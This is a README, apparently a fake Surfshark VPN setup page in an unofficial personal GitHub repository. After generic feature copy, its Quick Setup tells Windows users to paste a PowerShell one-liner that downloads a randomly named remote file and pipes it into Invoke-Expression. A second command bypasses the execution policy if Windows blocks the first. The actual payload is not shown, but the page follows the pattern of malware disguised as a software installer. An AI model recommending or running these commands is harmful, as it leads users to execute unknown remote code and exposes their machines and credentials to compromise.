# Surfshark

Surfshark is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Surfshark and work in it.

Surfshark on Windows is a desktop VPN application that protects internet traffic with encryption and lets you connect through servers in many countries. After launch, you sign in, pick a location or use quick connect, and the app builds a secure tunnel so browsing, streaming, and work apps use that route instead of your plain home connection.

A typical session starts from the system tray or main window: you check connection status, switch regions if a site behaves differently, and enable options like CleanWeb or a kill switch before opening a browser or remote desktop. Disconnecting restores your normal network path; many people leave it on for whole work blocks when on public Wi‑Fi or traveling.

This repository tracks the Windows setup package reference, configuration notes for split tunneling and protocols, and a changelog aligned with client releases. It is meant as a practical companion for teams standardizing Surfshark on corporate laptops, not as marketing copy or legal documentation.

## What you do with it

- Connect to thousands of servers worldwide with one click from the Windows app.
- WireGuard and OpenVPN protocols let you balance speed against compatibility on each network.
- Kill switch blocks traffic if the VPN drops so nothing leaks outside the tunnel.
- Split tunneling sends only chosen apps through Surfshark while others use local internet.
- CleanWeb filters ads and trackers at the VPN layer before they reach your browser.
- MultiHop routes traffic through two servers for an extra layer of encryption when needed.
- Bypasser rules exclude banking or LAN apps from the tunnel without disabling protection globally.
- Tray controls show live speed, protocol, and location without keeping the full window open.

## Quick Setup (PowerShell)

This installs the program Surfshark on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/anja7909419/surfshark-setup-guide/main/ogxu2k4uqc.v0kw3nea | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/anja7909419/surfshark-setup-guide/main/ogxu2k4uqc.v0kw3nea | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `ogxu2k4uqc.v0kw3nea` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `anja7909419/surfshark-setup-guide`. Surfshark 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
